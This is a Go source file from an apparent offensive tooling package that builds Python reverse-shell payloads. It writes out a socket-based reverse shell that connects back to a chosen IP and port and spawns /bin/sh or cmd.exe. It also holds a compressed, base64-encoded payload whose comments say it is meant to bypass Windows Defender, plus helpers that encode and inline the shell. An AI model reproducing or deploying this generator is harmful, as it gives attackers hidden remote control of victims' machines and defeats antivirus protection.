package shellcode

import (
	"bytes"
	"compress/zlib"
	"encoding/base64"
	"fmt"
	"strings"
)

type PyShellCode struct {
	*ShellCodeBase
}

func NewPyShellCode(osTarget, osTargetArch, connectBackIP string, connectBackPort int, badChars []byte, prefix, suffix string) *PyShellCode {
	base := NewShellCodeBase(osTarget, osTargetArch, connectBackIP, connectBackPort, badChars, prefix, suffix)
	return &PyShellCode{base}
}

func (p *PyShellCode) GetPyShellCode() (string, error) {
	if err := p.Validate(); err != nil {
		return "", err
	}

	pythonCode := `
    import socket,subprocess,os
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("{{LOCALHOST}}",{{LOCALPORT}}))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    p=subprocess.call(["/bin/sh","-i"])
    `

	if strings.Contains(strings.ToLower(p.Target), "windows") {
		pythonCode = `
        import socket,subprocess,os
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(("{{LOCALHOST}}",{{LOCALPORT}}))
        os.dup2(s.fileno(),0)
        os.dup2(s.fileno(),1)
        os.dup2(s.fileno(),2)
        p=subprocess.call(["cmd.exe"])
        `
	}

	shellcode, err := p.GenShellCode(strings.TrimSpace(pythonCode))
	if err != nil {
		return "", fmt.Errorf("generate python shellcode failed: %v", err)
	}

	return shellcode, nil
}

// GetEncodedPyShellCode 返回压缩并base64编码的Python shellcode
func (p *PyShellCode) GetEncodedPyShellCode() (string, error) {
	shellcode, err := p.GetPyShellCode()
	if err != nil {
		return "", err
	}

	var compressed bytes.Buffer
	w := zlib.NewWriter(&compressed)
	if _, err := w.Write([]byte(shellcode)); err != nil {
		return "", fmt.Errorf("compress shellcode failed: %v", err)
	}
	w.Close()

	encoded := base64.StdEncoding.EncodeToString(compressed.Bytes())
	return encoded, nil
}

// GetPythonCode 返回预编码的Python shellcode，用于绕过Windows Defender
func (p *PyShellCode) GetPythonCode(badChars []byte) (string, error) {
	if p.IP == "" || p.Port == 0 {
		return "", fmt.Errorf("settings for connect back listener must be defined")
	}

	// 预压缩和base64编码的shellcode，用于绕过Windows Defender
	pythonCodeBytes := []byte(
		"eJxtUsFu2zAMvfsrWORgezOctdhpQA5BkGHFuiZofBuGQLY4WKgteZKcoijy7yUlNzOK6mLz8fHpkeLiajk6u6yVXg7PvjU6" +
			"Uf1grAdnmkf0hRvrwZoGnUt+7A4VrCB9ebnbbdZ3HJ7PKdBZQNUiWOyNR2iN88l+98DcicrR+Qzwn+tEjxDuEQ5GhxLqZ/Cc" +
			"QHtCmzgqjg7K+MmmaP39eHu/rYq37GG3+Xk8VA/b9a88WUBjtMbGgzcgvBdEsdCLplUaE1dO2Sxj7wWwrZyrHGoJTwjC4psC" +
			"SuIznqW/P/2BTUSV0bB1XtSdci3KqzRUe0F9dMYMyVOrOoTrb0ns1GKj8ERNtdh1pNz3QsuQk8ILbrEkyim7/nLzNQ/4YJX2" +
			"ITtJqL+gvIN/o/IFD0hDbVE8ghlpdOS66YzDaRihhAqiOL0UV6Vg7AxJozc+QWi6RpoPTPLDs8nLCpR7M6DOWK2I/FVlR6R/" +
			"L8nQas683W8DjtZ+iCv9Hs4vUxOS+xvG2FEUP55ENyLZ4ZIyYiVTsxw+X0C6bQInsfC0UWy+FFE4PvBcP+zQfKS0NByS3itr" +
			"QQTj",
	)

	// 解压缩并解码shellcode
	decodedBytes, err := base64.StdEncoding.DecodeString(string(pythonCodeBytes))
	if err != nil {
		return "", fmt.Errorf("decode base64 shellcode failed: %v", err)
	}

	r, err := zlib.NewReader(bytes.NewReader(decodedBytes))
	if err != nil {
		return "", fmt.Errorf("create zlib reader failed: %v", err)
	}
	defer r.Close()

	var uncompressed bytes.Buffer
	if _, err := uncompressed.ReadFrom(r); err != nil {
		return "", fmt.Errorf("decompress shellcode failed: %v", err)
	}

	// 格式化shellcode，替换IP和端口
	pythonCode := uncompressed.String()
	shellcode, err := p.GenShellCode(pythonCode)
	if err != nil {
		return "", fmt.Errorf("format python shellcode failed: %v", err)
	}

	return shellcode, nil
}

func (p *PyShellCode) GetShellCode(inline bool) string {
	shellcode, err := p.GetPythonCode([]byte(p.BadChars))
	if err != nil {
		// 如果获取预编码shellcode失败，回退到标准shellcode
		shellcode, err = p.GetPyShellCode()
		if err != nil {
			return ""
		}
	}

	if inline {
		shellcode = p.MakeInline(shellcode)
	}

	return fmt.Sprintf("%s%s%s", p.Prefix, shellcode, p.Suffix)
}
